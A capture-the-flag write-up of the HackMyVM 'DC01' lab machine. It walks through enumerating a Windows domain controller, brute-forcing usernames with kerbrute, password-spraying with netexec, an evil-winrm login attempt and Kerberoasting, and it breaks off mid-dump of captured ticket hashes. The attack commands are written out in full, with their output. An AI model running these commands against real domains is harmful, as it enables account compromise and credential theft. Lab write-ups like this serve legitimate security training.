---
title: Write-up DC01 on HackMyVM
author: eMVee
date: 2026-08-04 00:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, Windows, DC01, kerbrute, kerberoasting, netexec, hashcat, smbclient, Pass-the-Hash, evil-winrm]
render_with_liquid: false
---

Getting back into the rhythm requires speed and volume, and I am not slowing down. After knocking out several boxes in rapid succession, my next target on HackMyVM is DC01. This Windows environment is the logical next step to test my active methodology and see how well my refreshed skills hold up against enterprise style configurations.

## Getting started
Our next target is DC01, a Windows machine from HackMyVM.eu. Once downloaded, I'll import it into my lab environment. It’s built for Oracle VirtualBox, so setup should be seamless within our isolated lab network. To keep things organized before launching any attacks, I'll quickly create a dedicated working directory and double-check my network configuration.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents

┌──(emvee㉿kali)-[~/Documents]
└─$ mkdir DC01     
                                                                                                         
┌──(emvee㉿kali)-[~/Documents]
└─$ cd DC01                                                         
```

## Enumeration
Before interacting with any target, it is standard practice to verify our local configuration. Knowing our own IP address helps establish situational awareness and allows us to trace our activity if monitored by a Security Operations Center (SOC). We will focus on the active interface, `eth0`.

```bash                                                 
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:24:46:73 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.3/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 493sec preferred_lft 493sec
    inet6 fe80::a00:27ff:fe24:4673/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:29:1d:6b:8a brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-d3f1e1da70ec: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:11:af:bc:31 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-d3f1e1da70ec
       valid_lft forever preferred_lft forever
    inet6 fe80::42:11ff:feaf:bc31/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
6: veth0b22038@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-d3f1e1da70ec state UP group default 
    link/ether d2:db:8c:21:ce:f4 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::d0db:8cff:fe21:cef4/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
8: veth7b9ddce@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-d3f1e1da70ec state UP group default 
    link/ether 76:fe:31:2d:25:75 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::74fe:31ff:fe2d:2575/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
10: vethb48063e@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-d3f1e1da70ec state UP group default 
    link/ether c6:a7:27:1c:6e:1a brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::c4a7:27ff:fe1c:6e1a/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever


```
Next, we will perform network reconnaissance using netdiscover to map out active machines in the lab subnet. Based on the target network segment, we execute the scan directly against our current IP range.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ sudo netdiscover -r 10.0.2.3/24
[sudo] password for emvee:

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                          
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.2        08:00:27:a2:0a:c2      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 
 10.0.2.10       08:00:27:b4:1e:3e      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 

                                                                  

```
There are two other devices found in my virtual network. We know that that The vulnerable machine is alive and has assigned the IP address 10.0.2.10. To make our life easier we can create a variable `ip` with that specific IP address. This variable can be used in commands and it will save time typing the IP address each time.

```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ ip=10.0.2.10
```
Before exploiting anything, we should run a nmap port scan to identify active services on the target. Since this is my own lab we can be loud while scanning for open ports.

```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ sudo nmap -sC -sV -T4 -p- $ip  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-04 22:17 +0200
Nmap scan report for 10.0.2.10
Host is up (0.0011s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-05 05:18:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:B4:1E:3E (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-05T05:19:32
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:b4:1e:3e (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 8h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.43 seconds

```

The scan completed successfully and this time there are more open ports discovered. We should take a lot of notes this time. 
- Operating System: Microsoft Windows (specifically configured as a Windows Domain Controller).
- Domain Name: SOUPEDECODE.LOCAL
- Host Name: DC01
Some key open ports & services
- Port 88 (Kerberos): Active and running Microsoft Windows Kerberos.
- Port 389 & 3268 (LDAP / Global Catalog): Active and exposing the domain structure, site layout (Default-First-Site-Name), and full domain name.
- Port 445 (SMB): Message signing is enabled and required (SMBv3.1.1), meaning basic SMB relay attacks will not work out of the box.
- Port 5985 (WinRM): HTTP-based Windows Remote Management is open, indicating a potential avenue for remote shell access if you compromise valid credentials.


Let's check if we can see any details via the SMB service.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ nxc smb 10.0.2.10 -u '' -p '' --users
SMB         10.0.2.10       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED 
```
We don't have access to list the domain users via a null session. But we did discover a version of the Operating System being used: `Windows Server 2022 Build 20348 x64`. Since a strict null session is blocked, we can try to enter guest without a password to see if guest users are allowed on the system.

Let's add the target to our `/etc/hosts` file before continuing with our enumeration. We will map the IP to the full domain name, the short hostname, and the root domain to prevent Kerberos errors later.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ sudo nano /etc/hosts         
[sudo] password for emvee: 

┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.10       DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now let's enter the username guest and run the check for shares again.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --shares
SMB         10.0.2.10       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.10       445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.0.2.10       445    DC01             [*] Enumerated shares
SMB         10.0.2.10       445    DC01             Share           Permissions     Remark
SMB         10.0.2.10       445    DC01             -----           -----------     ------
SMB         10.0.2.10       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.10       445    DC01             backup                          
SMB         10.0.2.10       445    DC01             C$                              Default share
SMB         10.0.2.10       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.10       445    DC01             NETLOGON                        Logon server share 
SMB         10.0.2.10       445    DC01             SYSVOL                          Logon server share 
SMB         10.0.2.10       445    DC01             Users         
```

The login is successful, meaning guest access is enabled. We have READ permissions on the `IPC$` share. We can see other shares like `backup` and `Users` exist, but we do not have access to read their contents with this guest account.

Since port 88 is open and running Kerberos, we can try to bruteforce usernames with `kerbrute`.
```bash
┌──(emvee㉿kali)-[~]
└─$ ./kerbrute userenum -d SOUPEDECODE.LOCAL --dc 10.0.2.10 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/04/26 - Ronnie Flathers @ropnop

2026/08/04 23:06:03 >  Using KDC(s):
2026/08/04 23:06:03 >   10.0.2.10:88

2026/08/04 23:06:03 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2026/08/04 23:06:03 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2026/08/04 23:06:03 >  [+] VALID USERNAME:       guest@SOUPEDECODE.LOCAL
2026/08/04 23:06:03 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2026/08/04 23:06:04 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2026/08/04 23:06:04 >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL
2026/08/04 23:06:09 >  [+] VALID USERNAME:       Guest@SOUPEDECODE.LOCAL
2026/08/04 23:06:09 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2026/08/04 23:06:09 >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2026/08/04 23:06:40 >  [+] VALID USERNAME:       GUEST@SOUPEDECODE.LOCAL
2026/08/04 23:07:05 >  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL

```
The tool successfully enumerated several valid domain accounts. Kerberos is case insensitive for authentication, which explains why the wordlist hits return duplicate results with different capitalizations. In total, we discovered three unique valid users: `admin`, `charlie`, and `administrator` (besides the built-in guest account).

We can try to enumerate all users by leveraging our active guest session to perform a RID bruteforce using netexec. We can chain this with grep and awk to extract a clean list of usernames directly into a file.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --users --rid-brute | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt 
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ wc users.txt 
 1069  1069 10074 users.txt
```
Next, we can perform a password spray attack using `netexec` to see if we can obtain valid credentials. We will test if any user is using their own username as their password by passing our `users.txt` file as both the username and password argument. We will use `--continue-on-success` to make sure the scan finishes even if a valid combination is found.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.0.2.10       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:file_svc STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE 
```
The attack successfully discovered one valid credential pair on the target network. The user account `ybob317` is using its own username as the password, resulting in a successful login status (`[+]`).

Since port 5985 is open and running WinRM, we can try to establish an interactive remote PowerShell session using our newly acquired credentials for ybob317 with evil-winrm.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ evil-winrm -i DC01.SOUPEDECODE.LOCAL -u 'ybob317' -p 'ybob317'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> cd c:\users\ybob317
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1

```

The connection fails with a `WinRMAuthorizationError` when trying to execute commands. This indicates that while the credentials for `ybob317` are 100% valid, this user account does not have the required administrative privileges or membership in the "Remote Management Users" group to obtain a remote shell on the Domain Controller.

### Kerberoasting
Since we cannot obtain a direct shell with our current low privileged account, we can move to Kerberoasting. We will utilize our valid credentials for `ybob317` with Impacket's `GetUserSPNs` to query the Active Directory database and enumerate all domain accounts that have a Service Principal Name (SPN) registered.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.0.2.10                   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 19:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 19:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 19:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 19:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 19:29:18.511871  <never>  
```
The scan successfully enumerates five active service accounts mapped to SPNs. Because these are standard user accounts running network services, we can request Kerberos tickets (`TGS-REP`) for them and attempt to crack their password hashes offline.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.0.2.10 -request -outputfile kerberoast_hashes.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 19:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 19:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 19:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 19:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 19:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
The request fails with a `KRB_AP_ERR_SKEW` error. This happens because the time difference between our Kali machine and the Domain Controller is greater than the allowed 5-minute Kerberos threshold. We need to synchronize our system clock with the target server before running the request again.

To fix this time synchronization issue and prevent VirtualBox from instantly reverting our system clock, we must disable the guest utilities daemon. Once the hypervisor integration is stopped and local network time services are disabled, we can successfully force a one-time synchronization against the Domain Controller's NTP service.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ sudo systemctl stop virtualbox-guest-utils

┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ sudo timedatectl set-ntp false                       
[sudo] password for emvee:

┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ sudo ntpdate -u 10.0.2.10                                                                                               
[sudo] password for emvee: 
2026-08-05 09:17:59.611500 (+0200) +1055.927464 +/- 0.000611 10.0.2.10 s1 no-leap
CLOCK: time stepped by 1055.927464
```
The command successfully steps our system clock forward to match the target environment exactly. With VirtualBox background syncing disabled and the local clock locked within the mandatory 5-minute Kerberos threshold, we can proceed to request the TGS tickets without encountering further clock skew errors.

With our system time successfully aligned with the Domain Controller, we can execute the `impacket-GetUserSPNs` command again. By adding the `-request` flag and specifying the FQDN via `-dc-host`, we instruct the tool to request the Kerberos Ticket Granting Service (TGS) tickets for all discovered SPNs and export the resulting hashes to a file for offline cracking.

```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-host DC01.SOUPEDECODE.LOCAL -request -outputfile kerberoast_hashes.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 19:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 19:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 19:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 19:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 19:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
```
The command completes without any clock skew errors. The informational notice regarding the missing CCache file can be ignored, as Impacket successfully falls back to standard password authentication to pull the data. We can verify that the encrypted Kerberos tickets have been extracted and properly saved by checking the contents of our output file.

```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ cat kerberoast_hashes.txt 
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$aee6ac5c324d3a59a6f4dff81ce87adf$e94659e484a7fee3e1c6f5ca03b407a6376a29ef9c008a55f69304210074c3b9a4a221c35f7a764206ed62892d68cbff3cc24fb2c375740a3774145fbb3cc1019d3851ab774460e83a9627d778c9bae0b51fc7d4ca8af129bfe84bcd075430a08932492d500421326b0c8b67a2d0c567b2b2b0e7e77a5f0ca18ef4ab47da02616588c72afeabed875939fd13fa4e1e135a09d5becbd503bfb3a0f02ca2c6b8a0296f64b2b73ec1cfa6bea5459e384de4ca1b47e8af1db25fc02c4831c749e960404f76e46610d2a80e0f7443158801d266b78ed2221c7f473743b6c49df27df61c3a8cd70a8fab31086cb194a2232d7b48f0e714590038fa2bdd75d3a96d1fc4bc29db59793cad0a0d0a83225512aab617d0ce5278497a173aa244cf553617b9245094547ceb44f6cb07d362bcdaaa8728cbc96bd5ca3a7dd9f1baeb6bb904e5ff18c62e28b9a125e25d838b277d615a8438366f3aadc0b470577621860917d562b7193ad41a75ca4a5af4065e0e9551c4ac01aa8d5018a4f01467f7471553f0e627655579a5620fe5e923dd004cfded59604cf87eefbb413b7a0731769f6bd9dbfc2bc1a429b0ec4246f8b1a4e9e9179b7b01e31b89bef1af1b5b3a0f48d509214d1abea7ea5f350a6bd1ed12bdf3722832d77df0f1d8d8e91dc58e5604fbff0968b94ba7e12cbf711a75307fc6286ec1c226f71b40f463261df9dade442632793d4b6afdfa623d69a37f77b307caf847250eed6962ca804a23d30c528559ed6a8ff2958972e86b6da8fba1dace446424df813ed620fd41b34bbac21976f3995c8a7d3fe23cb1165b9aa3b5ac78e75fef6a4cff075ae0fb1e9978265df30b235cc5a137a9a31e2e9f78cd08cdbec45011e34bf2f9394dd156cab26d314b8e85bb0a654aaf14ddce53a4fc086124366f5701563d47bf9c2c8761bbb125ed0b7b19079c2597ee0dfe7731d5ee40bf35e121c5ecaf80e407e851038540f647af1dcd919c2240590e011688e09c1df8a1197f9c3fd30e8abc259a07a3e07bc2823a77de490084b21259bd946470e0330176ba3547eceabcb75ee2c2b6bf6dc0ec189e0f35c32d0706cd52bd3993068332ce0430c6be9cc0a128f49f4da47ed01afec89c3e9227d9b288dfe07dc944cae4d7d1b21d5ee185a1e9a3f4f1bc1d7f067269fdeb5117b24c138310ef54513295f28426f8219ed99d5d90e32042468bc2e37003de670eeb4f517f01857177330764179f301267da6d8a3fa40d8a44315515273d7a1b6c473b27806b0ddba07c0056f793d69fe0527ae2d8137123160fd1710c7564c60fbcb1a8de0f5a1e3a0a387a281c9c1a1222f8de0384a9c86d6e47871cb33f94a67799c6c9fd0091db48935fd8881ec242050e485a44324008735ec4e7f9782c240acb7cc664940dd174cb259cb694a0d771aad855a7e0d964dd7ea4036d2c5b0c5ecff67c20119d17b0bc3c4914ff85f0b44c8030fdebfff2f861464f
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$219c7c9bb46e072a568a2b3606594e3d$b3840cdeeb1f0e2fb4fadb88d624c99c45742287dec067af2ad952ba2d58f3a36d435b57890656b1452ad3e5bd9c793b905b42ab71a1ae011ddb270538cadb8ec83b26751eda757d44f92f61eb2267ca54feadd0c020bb8a5700fa41be3f268ac2a294c0f0373e7d20ae9ced9a14df0be14dcc99e4c315a748c677f9dd0233a9562c03576a8c50c1be1707cf44b0f0e6e96bab0c7fc27c478c973856e6c2710ed33a6fbeaf49cd0fa58261ea167abb9e3eabe64d9b69ee830fbfe3f683762fbf838d2efc55bd3029d2287cb60bd59f174564fdf9dd232d7d4f69db3b740c5275920f88542b3571217c93dceeae99d6ef60d21267eed3542eb0d0a27cfa82b91fa9435414a2b4adc1044f140cb09ffdbce467e037626e5a8e17921d3480c821fe0a3cbb39fe9b80e3e9a8db5c2cfab07efd839b92b70545405cf1a10a609090a23db714b47d890eda4295e0c55de6964454e5fecf7dc9c924448e151d7f32e63c59b95802cf6bfdeaac9146ec132ae8c921780268f504b6d62b648436d7563647ea7ca4adedf85fb494f9b28f1e4a0bf6e6c09bfc0562fb56c6529db8616d585224e2486052c7724dceed85ab284702a96bee62d38348f98bc6a5e933602ff1d07dfbe44e86d2e359973122bcdd3a7fee92fcf3731af4d4323b970ac03367c0fc6a1534bcc2db475dd3482810fffdd60ba702aee4d271c2cd6306f311a2c4ee826be003e09dce291ed5ee21e9f92d7e2370fa3687d02c9888aebfb8b862b62bc0f52eb416f444c29c2192b4bf047388626c98dbc24bb8d27093f80173ca77df374c13899d2ce42baf342d00d0a9f5cf973f4edda10bd2db112eed45fc9fe626f1ef0dc2172217aad40f5d93a85af1bba61655fc4c7f817d38522e07db7c47e89a8591e970b399e49278ff096a083e44aac06cecae88fca5b1f5dc9b17da960c3ac0bfb0c8be69c7b8a36379a2fef4b7c931662dfa383a1f2e7a3f56c46afbc46a643b3419be3acc0ca4e70025c480fc486bbd7c8b911c4ad93c23f3ee3789ee121fde4f6fa1b122430b70e73974d1f6f82b1c3823be031c863d35457cf308c5b512781181daa1070e6031b73c86f6694f264998e1ee66d32aeed6bb73bc8fef2226ff600101efb036822eef7bb3bc13daeebdf9a693a663bb0cb70981de17cefb9088758e4cc726b0099e2dff9996cb169073bfb682cada3d225ac5904baaac99080f487b3c978f3b2d4ecbb6c932a717b03ba1a98ccc5d685abf2c61c517370b3143307f349a9ccefe72a74e2f525656e422ff595547c35a9e83773775a1bda46be1b48726af9fddedd2e627700b2cb2fa85d9ddf394969ebf5f9811a015d14c9c45b0e450d7c439c217e7a3a88df2a16c377fc2cdeffce91b9367c3887a5819416cc226d4088b8fdcfb635bfcd029b4647dcc0cae5bf305a509a6ddba6a1671edb97309bab461cc257e4ef955c42215a1ed512a2b5af2e81271bf7fe0698044cc
